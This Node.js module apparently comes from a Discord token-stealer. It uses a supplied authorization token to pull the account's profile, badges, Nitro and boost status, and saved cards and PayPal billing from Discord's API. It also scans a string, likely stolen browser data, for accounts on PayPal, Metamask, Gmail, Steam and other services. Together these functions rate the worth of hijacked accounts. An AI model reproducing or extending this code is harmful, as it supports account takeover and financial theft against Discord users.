const config = require("../../../config.json");
const axios = require("axios");
const moment = require("moment-timezone");
const discord = async (url, token) => {
    try {
        const info = (await axios({ url: url, method: "GET", headers: { authorization: token } })).data;
        return info;
    } catch (err) {
        return false;
    }
};

const badges = async (flags) => {
    let b = '';
    for (const prop in config.badges) {
        let o = config.badges[prop];
        if ((flags & o.value) == o.value) b += o.emoji;
    };

    if (b == '') b = "`No badges`"
    return b;
};

const rbadges = async (flags) => {
    let b = '';
    for (const prop in config.badges.rare) {
        let o = config.badges.rare[prop];
        if ((flags & o.value) == o.value) b += o.emoji;
    };
    if (b == '') b = ""
    return b;
};
const billing = async (bil) => {
    let billing = "";
    if (bil.length > 0) billing = ` `;
    else billing = "`No`";
    bil.forEach(i => { i.brand && 0 == i.invalid && (billing += config.emoji.billing.cb), i.email && (billing += config.emoji.billing.ppl) });
    return billing;
};

const includes = async (pp) => {
    let i = "";
    if (pp.includes("paypal")) i += "paypal, ";
    if (pp.includes("youtube")) i += "youtube, ";
    if (pp.includes("mail.google")) i += "gmail, ";
    if (pp.includes("twitch")) i += "twitch, ";
    if (pp.includes("github")) i += "github, ";
    if (pp.includes("twitch")) i += "twitch, ";
    if (pp.includes("steam")) i += "steam, ";
    if (pp.includes("discord")) i += "discord, ";
    if (pp.includes("amazon")) i += "amazon, ";
    if (pp.includes("epicgames") || pp.includes("epic-games")) i += "epicgames, ";
    if (pp.includes("tiktok")) i += "tiktok, ";
    if (pp.includes("netflix")) i += "netflix, ";
    if (pp.includes("disneyplus")) i += "disneyplus, ";
    if (pp.includes("animedigitalnetwork")) i += "adn, ";
    if (pp.includes("wakanim")) i += "tiktok, ";
    if (pp.includes("crunchyroll")) i += "crunchyroll, ";
    if (pp.includes("intagram")) i += "intagram, ";
    if (pp.includes("ionos")) i += "ionos, ";
    if (pp.includes("mojang")) i += "minecraft, ";
    if (pp.includes("roblox")) i += "roblox, ";
    if (pp.includes("spotify")) i += "spotify, ";
    if (pp.includes("blizzard") || pp.includes("batle.net")) i += "batle.net, ";
    if (pp.includes("metamask")) i += "metamask, ";
    if (pp.includes("outlook")) i += "outlook, ";
    if (pp.includes("protonmail")) i += "protonmail, ";
    if (pp.includes("yahoo")) i += "yahoo, ";
    if (pp.includes("twitter")) i += "twitter, ";
    if (pp.includes("facebook")) i += "facebook, ";
    if (pp.includes("skype")) i += "skype, ";
    if (pp.includes("steam")) i += "steam, ";
    if (pp.includes("rockstargames")) i += "rockstargames, ";
    if (pp.includes("canal-plus")) i += "canal-plus, ";
    if (pp.includes("orange")) i += "orange, ";
    if (pp.includes("spotify")) i += "spotify, ";
    return i || "";
};

const nitro = async (info, token) => {
    let b = "";
    if (info.premium_type === 1 || info.premium_type === 2) b += `${config.badges.User_Badge_Nitro.emoji} `;
    if (info.premium_type === 2) b += await badgeboost(info, token);
    if (b == "") b = "`No nitro`";
    return b;
};

module.exports = { discord, badges, rbadges, billing, includes, nitro };

async function badgeboost(data, token) {
    let r = false;
    const res2 = (await axios({ url: `https://discord.com/api/v9/users/${data.id}/profile?with_mutual_guilds=false`, method: "GET", headers: { authorization: token } })).data;
    if (!res2) return;
    const boostdate = res2.premium_since;
    if (boostdate) {
        const date1 = new Date(moment(boostdate).format("YYYY-MM-DD hh:mm:ss"));
        const date2 = new Date(moment(new Date()).format("YYYY-MM-DD hh:mm:ss"));
        const diff = dif(date1, date2);
        return r = `${boost(diff.week)}`
    };
    if (r) return r;
    else return "";
}
function boost(time) {
    let badge = "";
    if (time === 0 || time === 1) badge = config.badges.User_Badge_Boost1.emoji;
    if (time === 2) badge = config.badges.User_Badge_Boost2.emoji;
    if (time === 3 || time === 4 || time === 5) badge = config.badges.User_Badge_Boost3.emoji;
    if (time === 6 || time === 7 || time === 8) badge = config.badges.User_Badge_Boost4.emoji;
    if (time === 9 || time === 10 || time === 11) badge = config.badges.User_Badge_Boost5.emoji;
    if (time === 12 || time === 13 || time === 14) badge = config.badges.User_Badge_Boost6.emoji;
    if (time === 15 || time === 16 || time === 17) badge = config.badges.User_Badge_Boost7.emoji;
    if (time === 18 || time === 19 || time === 20 || time === 21 || time === 22 || time === 23) badge = config.badges.User_Badge_Boost8.emoji;
    if (24 <= time) badge = config.badges.User_Badge_Boost9.emoji;
    if (badge === "") return config.badges.User_Badge_Boost1.emoji;
    return badge;
}
function dif(date1, date2) {
    let diff = {};
    let tmp = date2 - date1;
    tmp = Math.floor(tmp / 1000);
    diff.sec = tmp % 60;
    tmp = Math.floor((tmp - diff.sec) / 60);
    diff.min = tmp % 60;
    tmp = Math.floor((tmp - diff.min) / 60);
    diff.hour = tmp % 24;
    tmp = Math.floor((tmp - diff.hour) / 24);
    diff.day = tmp;
    tmp = Math.floor((diff.day) / 31);
    diff.week = tmp;
    return diff;
}